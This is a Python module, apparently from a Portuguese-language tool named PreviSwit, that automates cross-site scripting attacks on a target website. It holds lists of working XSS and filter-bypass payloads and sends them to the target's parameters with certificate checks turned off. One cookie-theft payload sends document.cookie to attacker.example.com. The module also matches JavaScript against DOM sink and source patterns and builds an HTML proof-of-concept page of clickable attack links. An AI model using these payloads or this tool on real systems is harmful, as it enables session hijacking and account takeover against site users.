"""
attack/xss_attacker.py — Pipeline 4: Exploração automatizada de XSS.

Lê findings XSS e executa:
  1. Confirma refletido/stored com payloads progressivos
  2. Testa bypass de filtros WAF comuns (encoding, case, eventos alternativos)
  3. Verifica XSS DOM (padrões no JS)
  4. Testa roubo de cookies via onerror/onload
  5. Gera PoC HTML funcional
"""
import re
import requests
from core.utils import print_status


# ─── Payloads progressivos ────────────────────────────────────────────────────

BASIC_PAYLOADS = [
    "<script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
]

BYPASS_PAYLOADS = [
    # Encoding
    "<ScRiPt>alert(1)</sCrIpT>",
    "<script>alert`1`</script>",
    "<%73%63%72%69%70%74>alert(1)</%73%63%72%69%70%74>",
    # Eventos alternativos
    "<body onresize=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    # Atributos HTML5
    "<video><source onerror=alert(1)>",
    "<object data='javascript:alert(1)'>",
    # Sem espaço
    "<img/src=x/onerror=alert(1)>",
    # Double-encode
    "%253Cscript%253Ealert(1)%253C/script%253E",
]

COOKIE_STEAL_PAYLOAD = (
    "<script>new Image().src='http://attacker.example.com/steal?"
    "c='+encodeURIComponent(document.cookie)</script>"
)

DOM_SINKS = [
    r"document\.write\s*\(",
    r"innerHTML\s*=",
    r"outerHTML\s*=",
    r"eval\s*\(",
    r"setTimeout\s*\(['\"]",
    r"setInterval\s*\(['\"]",
    r"location\.href\s*=",
    r"location\.replace\s*\(",
    r"window\.open\s*\(",
    r"\.src\s*=",
]

DOM_SOURCES = [
    r"location\.search",
    r"location\.hash",
    r"location\.href",
    r"document\.referrer",
    r"document\.URL",
    r"window\.name",
    r"localStorage\.getItem",
    r"sessionStorage\.getItem",
]


# ─── Classe ───────────────────────────────────────────────────────────────────

class XSSAttacker:
    """
    Recebe os findings do tipo XSS e tenta confirmar/escalar o ataque.
    """

    def __init__(self, target: str, findings: list, pages: list = None):
        self.target   = target
        self.findings = findings
        self.pages    = pages or []
        self.results  = {
            "confirmed_xss":    [],
            "bypass_xss":       [],
            "dom_xss":          [],
            "cookie_steal_poc": [],
            "poc_html":         None,
            "attack_log":       [],
        }

    def _get(self, url, params) -> requests.Response | None:
        try:
            return requests.get(url, params=params, timeout=8,
                                verify=False, allow_redirects=True)
        except Exception:
            return None

    def _post(self, url, data) -> requests.Response | None:
        try:
            return requests.post(url, data=data, timeout=8,
                                 verify=False, allow_redirects=True)
        except Exception:
            return None

    def _log(self, msg, level="INFO"):
        print_status(f"[XSS] {msg}", level)
        self.results["attack_log"].append(msg)

    # ── 1. Confirma XSS refletido ─────────────────────────────────────────────

    def _confirm_reflected(self, url: str, param: str, method: str):
        all_payloads = BASIC_PAYLOADS + BYPASS_PAYLOADS
        for payload in all_payloads:
            params = {param: payload}
            r = (self._get(url, params) if method == "GET"
                 else self._post(url, params))
            if r and payload.lower() in r.text.lower():
                entry = {
                    "url":     url,
                    "param":   param,
                    "method":  method,
                    "payload": payload,
                    "type":    "Reflected XSS",
                    "severity": "HIGH",
                }
                is_bypass = payload in BYPASS_PAYLOADS
                if is_bypass:
                    self.results["bypass_xss"].append(entry)
                    self._log(f"BYPASS XSS confirmado — {url} [{param}]", "CRIT")
                else:
                    self.results["confirmed_xss"].append(entry)
                    self._log(f"XSS refletido confirmado — {url} [{param}]", "CRIT")
                return entry
        return None

    # ── 2. Testa roubo de cookie ──────────────────────────────────────────────

    def _test_cookie_steal(self, url: str, param: str, method: str):
        params = {param: COOKIE_STEAL_PAYLOAD}
        r = (self._get(url, params) if method == "GET"
             else self._post(url, params))
        if r and "attacker.example.com" in r.text:
            self._log(f"Cookie-steal PoC refletido em {url}", "CRIT")
            self.results["cookie_steal_poc"].append({
                "url":     url,
                "param":   param,
                "payload": COOKIE_STEAL_PAYLOAD,
            })

    # ── 3. DOM XSS — análise estática de JS ───────────────────────────────────

    def _check_dom_xss(self):
        self._log("Analisando JS para DOM XSS...", "INFO")
        for page in self.pages:
            if ".js" not in page.get("url", ""):
                continue
            html = page.get("html", "")
            has_sink   = any(re.search(p, html) for p in DOM_SINKS)
            has_source = any(re.search(p, html) for p in DOM_SOURCES)
            if has_sink and has_source:
                sinks_found   = [p for p in DOM_SINKS   if re.search(p, html)]
                sources_found = [p for p in DOM_SOURCES if re.search(p, html)]
                entry = {
                    "url":     page["url"],
                    "sinks":   sinks_found[:3],
                    "sources": sources_found[:3],
                    "severity": "HIGH",
                    "note":    "Fonte controlável alcança sink perigoso — investigar manualmente.",
                }
                self.results["dom_xss"].append(entry)
                self._log(f"DOM XSS possível em {page['url']}", "CRIT")

    # ── 4. Gera PoC HTML ──────────────────────────────────────────────────────

    def _generate_poc_html(self):
        all_confirmed = self.results["confirmed_xss"] + self.results["bypass_xss"]
        if not all_confirmed:
            return

        entries = ""
        for x in all_confirmed[:10]:
            import urllib.parse
            params = urllib.parse.urlencode({x["param"]: x["payload"]})
            full_url = f"{x['url']}?{params}" if x["method"] == "GET" else x["url"]
            entries += f"""
            <tr>
              <td><span class="badge">{x['type']}</span></td>
              <td><a href="{full_url}" target="_blank">{x['url'][:70]}</a></td>
              <td><code>{x['param']}</code></td>
              <td><code class="payload">{x['payload'][:80]}</code></td>
            </tr>"""

        poc = f"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>XSS PoC — PreviSwit</title>
<style>
  body {{font-family:monospace;background:#0d0d1a;color:#f1faee;padding:20px}}
  h1   {{color:#e63946;margin-bottom:10px}}
  table{{width:100%;border-collapse:collapse;font-size:12px}}
  th   {{background:#1a1a2e;color:#adb5bd;padding:8px;text-align:left}}
  td   {{padding:8px;border-bottom:1px solid #1e1e3a}}
  .badge {{background:#e63946;color:#fff;padding:2px 8px;border-radius:4px;font-size:11px}}
  a    {{color:#457b9d}} code{{color:#7ec8a0}}
  .payload{{color:#f4a261}}
</style>
</head>
<body>
<h1>👁 XSS PoC — PreviSwit v3</h1>
<p>Alvo: <b>{self.target}</b> | {len(all_confirmed)} XSS confirmados</p>
<table>
  <thead><tr><th>Tipo</th><th>URL</th><th>Parâmetro</th><th>Payload</th></tr></thead>
  <tbody>{entries}</tbody>
</table>
</body></html>"""
        self.results["poc_html"] = poc
        self._log(f"PoC HTML gerado com {len(all_confirmed)} entry(s).", "SUCCESS")

    # ── Run ───────────────────────────────────────────────────────────────────

    def run(self) -> dict:
        xss_findings = [
            f for f in self.findings
            if "xss" in (f.get("issue","") + f.get("type","")).lower()
        ]

        if not xss_findings:
            self._log("Nenhum XSS nos findings — pulando.", "WARN")
            return self.results

        self._log(f"{len(xss_findings)} finding(s) XSS para escalar.", "CRIT")

        for finding in xss_findings[:8]:
            url    = finding.get("url", self.target)
            param  = finding.get("param", "q")
            method = finding.get("method", "GET").upper()
            self._confirm_reflected(url, param, method)
            self._test_cookie_steal(url, param, method)

        self._check_dom_xss()
        self._generate_poc_html()
        return self.results
